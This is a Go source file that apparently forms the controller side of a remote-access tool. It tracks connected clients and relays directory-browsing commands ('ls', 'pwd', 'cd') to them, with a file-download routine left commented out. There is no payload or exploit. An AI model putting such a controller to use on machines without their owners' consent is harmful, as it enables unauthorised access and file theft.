package server

import (
	"fmt"
	"github.com/pterm/pterm"
	"net"
	"strings"
	"sync"
)

type ClientList struct {
	mu   sync.Mutex
	list []*Client
}

func (list *ClientList) addClient(client *Client) {
	list.mu.Lock()
	defer list.mu.Unlock()
	list.list = append(list.list, client)
}

func (list *ClientList) removeClient(client *Client) {
	list.mu.Lock()
	defer func(conn net.Conn) {
		err := conn.Close()
		if err != nil {
			fmt.Println(err)
			return
		}
	}(client.conn)
	defer list.mu.Unlock()

	for i, cl := range list.list {
		if cl == client {
			list.list = append(list.list[:i], list.list[i+1:]...)
		}
	}

}

func (list *ClientList) clientsCheck() {
	list.mu.Lock()
	defer list.mu.Unlock()

	for i := 0; i < len(list.list); i++ {
		_, err := list.list[i].conn.Write([]byte(" "))
		if err != nil {
			list.list[i].isActual = false
			continue
		}
	}

}

func (list *ClientList) clientHandler(index int) {

	if len(list.list) > index {
		client := list.list[index]

		input := pterm.DefaultInteractiveTextInput
		input.DefaultText = client.name

		for {
			result, err := input.WithMultiLine(false).Show()

			if err != nil {
				fmt.Print(err)
				return
			}

			if result == "exit" {
				break
			}
			if result == "info" || result == "pwd" || result == "ls" {
				getTextFromClient(client, result)
			} else if strings.Contains(result, "cd") {
				dir := strings.Split(result, " ")

				if len(dir) == 2 && dir[0] == "cd" {
					getTextFromClient(client, result)

				} else {
					pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Println("Wrong format.  Please input 'h' or 'help' to show help")
				}

			} else if strings.Contains(result, "download") {
				dir := strings.Split(result, " ")

				if len(dir) == 2 && dir[0] == "download" {
					pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Println("Waiting ...")

					//pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Println("Waiting ...")
					//_, err := client.conn.Write([]byte(result))
					//if err != nil {
					//	return
					//}
					//file, err := os.Create("test.py")
					//if err != nil {
					//	fmt.Println("Unable to create file:", err)
					//	return
					//}
					//for {
					//
					//	buff := make([]byte, 1024)
					//	n, err := client.conn.Read(buff)
					//	if n == 0 || err != nil {
					//		fmt.Println("errrr", err)
					//		break
					//	}
					//
					//	_, err = file.Write(buff)
					//	if err != nil {
					//		fmt.Println(err)
					//		break
					//	}
					//	err = client.conn.SetReadDeadline(time.Now().Add(time.Millisecond * 700))
					//	if err != nil {
					//		fmt.Println(err)
					//		break
					//	}
					//}
					//err = file.Close()
					//fmt.Println("hi")
					//if err != nil {
					//	fmt.Println(err)
					//	return
					//}
				}
			}
		}
	} else {
		pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Println("Wrong command. Please input 'ls' or 'list' to show all connections")
	}
}
